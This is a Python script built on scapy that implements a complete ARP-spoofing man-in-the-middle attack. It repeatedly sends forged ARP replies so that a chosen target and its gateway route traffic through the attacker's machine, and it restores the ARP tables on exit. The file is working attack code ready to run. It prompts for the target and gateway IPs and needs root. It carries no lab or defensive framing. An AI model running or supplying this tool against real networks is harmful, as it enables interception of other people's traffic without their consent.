from scapy.all import ARP, Ether, send, srp
import os
import sys
import time
import re

class MITMAttack:
    def __init__(self, target_ip, gateway_ip, interface="eth0"):
        """
        Initialize the MITMAttack class with necessary parameters.
        :param target_ip: IP address of the target device.
        :param gateway_ip: IP address of the gateway (router).
        :param interface: Network interface to use (e.g., 'eth0').
        """
        if not self.validate_ip(target_ip):
            raise ValueError(f"Invalid IP address for target: {target_ip}")
        if not self.validate_ip(gateway_ip):
            raise ValueError(f"Invalid IP address for gateway: {gateway_ip}")

        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.interface = interface

    def validate_ip(self, ip):
        """
        Validate the IP address.
        :param ip: The IP address to validate.
        :return: True if valid, False otherwise.
        """
        ip_regex = re.compile(
            r'^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'
        )
        return ip_regex.match(ip) is not None

    def get_mac(self, ip):
        """
        Get the MAC address for a given IP address.
        :param ip: The IP address to find the MAC address for.
        :return: MAC address as a string, or None if not found.
        """
        arp_request = ARP(pdst=ip)
        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
        arp_request_broadcast = broadcast / arp_request
        answered_list = srp(arp_request_broadcast, timeout=2, verbose=False)[0]

        for element in answered_list:
            return element[1].hwsrc
        return None

    def spoof(self, target_ip, spoof_ip):
        """
        Send an ARP response to the target to associate the attacker's MAC with the spoofed IP.
        :param target_ip: The IP address of the target device.
        :param spoof_ip: The IP address to spoof (gateway or target).
        """
        target_mac = self.get_mac(target_ip)
        if target_mac is None:
            print(f"[-] Could not find MAC address for {target_ip}. Exiting...")
            sys.exit(1)

        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)

    def restore(self, dst_ip, src_ip):
        """
        Restore the original ARP table by sending correct ARP responses.
        :param dst_ip: The destination IP address.
        :param src_ip: The source IP address.
        """
        dst_mac = self.get_mac(dst_ip)
        src_mac = self.get_mac(src_ip)
        if dst_mac is None or src_mac is None:
            print(f"[-] Could not find MAC addresses. Exiting...")
            sys.exit(1)

        arp_response = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        send(arp_response, count=4, verbose=False)

    def run(self):
        """
        Run the MITM attack.
        """
        print(f"[*] Starting MITM attack on {self.target_ip} via {self.gateway_ip}")
        try:
            while True:
                self.spoof(self.target_ip, self.gateway_ip)
                self.spoof(self.gateway_ip, self.target_ip)
                time.sleep(2)
        except KeyboardInterrupt:
            print("[*] Detected CTRL+C ... Restoring the network.")
            self.restore(self.gateway_ip, self.target_ip)
            self.restore(self.target_ip, self.gateway_ip)
            print("[*] Network restored. Exiting...")


if __name__ == "__main__":
    if os.geteuid() != 0:
        print("[-] Please run this script as root.")
        sys.exit(1)

    target_ip = input("Enter the target IP address: ").strip()
    gateway_ip = input("Enter the gateway IP address: ").strip()
    interface = input("Enter the network interface (default is eth0): ").strip() or "eth0"

    try:
        mitm = MITMAttack(target_ip, gateway_ip, interface)
        mitm.run()
    except ValueError as e:
        print(e)
